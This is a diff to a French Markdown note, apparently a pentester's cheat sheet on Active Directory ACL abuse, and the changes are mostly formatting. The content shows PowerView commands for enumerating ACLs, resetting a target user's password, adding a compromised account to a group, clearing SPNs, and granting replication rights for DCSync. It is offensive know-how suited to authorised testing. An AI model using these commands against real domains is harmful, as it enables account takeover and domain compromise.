@@ -3,6 +3,7 @@ public: true # set to true to make the article publishable
 ---
 
 ## Enumération des ACLs
+
 ```powershell
 . .\PowerView.ps1
 # ACLs intéressantes (très long)
@@ -16,7 +17,8 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $si
 
 ## Exploitation de privilèges en notre possession
 
-On s'appuiera souvent sur des informations d'identification différentes d'un compte préalablement compris. 
+On s'appuiera souvent sur des informations d'identification différentes d'un compte préalablement compris.
+
 Dans ce cas, on utilisera le parametre `-Credential $creds` avec un objet PSCredential créé de la façon suivante :
 
 ```powershell
@@ -37,17 +39,20 @@ Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -
 ```
 
 ### ForceChangePassword (modification du mot de passe)
+
 ```powershell
 # Réinitialisation du password
 $pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
 Set-DomainUserPassword -Identity Target_AD_User -Password $pass
 ```
 
-### GenericWrite 
+### GenericWrite
 
 Permet :
+
 - l'ajout d'un utitilisateur comme membre d'un groupe sur le quel on dispose de ce droit
 - la modification du script de login pour tenter une exécution de code à distance (au prochain logon)
+
 ```powershell
 Add-DomainGroupMember -Identity "Target Group With GenericWrite right" -Members 'compromised'
 # Verification
@@ -79,4 +84,5 @@ Set-DomainObject -Identity $targetedUser -Clear serviceprincipalname
 ### WriteDacl
 
 Permet d'ajouter des DACL sur un compte utilisateur.
+
 Cela peut permettre d'ajouter les permissions `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All` et `DS-Replication-Get-Changes-In-Filtered-Set` qui permettent de réaliser une attaque ([[DCSync]])
